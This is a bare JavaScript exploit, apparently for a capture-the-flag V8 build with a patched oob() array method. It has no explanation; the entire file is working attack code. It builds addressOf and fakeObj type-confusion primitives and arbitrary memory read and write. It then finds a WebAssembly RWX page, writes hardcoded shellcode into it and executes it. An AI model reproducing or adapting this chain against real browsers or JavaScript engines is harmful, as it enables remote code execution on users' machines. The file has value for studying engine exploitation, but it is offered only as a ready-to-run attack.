// type convert
var buffer = new ArrayBuffer(0x8);
var float64 = new Float64Array(buffer);
var BigUint64 = new BigUint64Array(buffer);

function ftoi(value){
	float64[0] = value;
	return BigUint64[0];
}

function itof(value){
	BigUint64[0] = value;
	return float64[0];
}

function hex(value){
	return "0x" + value.toString(16);
}

// type confusion
var obj = {"a":1};
var obj_arr = [obj];
var float64_arr = [1.1];
var obj_arr_map = obj_arr.oob();
var float64_arr_map = float64_arr.oob();

function addressOf(target){
	obj_arr[0] = target;
	obj_arr.oob(float64_arr_map);
	let addr = ftoi(obj_arr[0]);
	obj_arr.oob(obj_arr_map);
	return addr;
}

function fakeObj(addr){
	float64_arr[0] = itof(addr);
	float64_arr.oob(obj_arr_map);
	let ret_obj = float64_arr[0];
	float64_arr.oob(float64_arr_map);
	return ret_obj;
}

var arb_rw_tools = [float64_arr_map, 1.2, 1.3, 1.4];
var arb_tools_addr = addressOf(arb_rw_tools);

function read64(addr){
	if(addr % 2n == 0)addr += 1n;
	let fake_obj = fakeObj(arb_tools_addr - 0x20n);
	arb_rw_tools[2] = itof(addr - 0x10n);
	return ftoi(fake_obj[0]);
}

function write64(addr, value){
	if(addr % 2n == 0)addr += 1n;
	let fake_obj = fakeObj(arb_tools_addr - 0x20n);
	arb_rw_tools[2] = itof(addr - 0x10n);
	fake_obj[0] = itof(value);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

addr_f = addressOf(f);
var shared_info_addr = read64(addr_f + 0x18n);
var data_addr = read64(shared_info_addr + 0x8n);
var instance_addr = read64(data_addr + 0x10n);
var rwx_addr = read64(instance_addr + 0x88n);

var sc_arr = [
    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,
    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,
    0x1485e086a56f631n,    0x313b68e6894856e6n,    0x101012434810101n,    0x4c50534944b84801n,
    0x6a52d231503d5941n,    0x894852e201485a08n,    0x50f583b6ae2n,
];
var dataview_buffer = new ArrayBuffer(sc_arr.length * 8);
var data_view = new DataView(dataview_buffer);
var buf_backing_store_addr = addressOf(dataview_buffer) + 0x20n

write64(buf_backing_store_addr, rwx_addr);

for(let i = 0; i < sc_arr.length; i++) {
    data_view.setFloat64(i * 8, itof(sc_arr[i]), true);
}

f();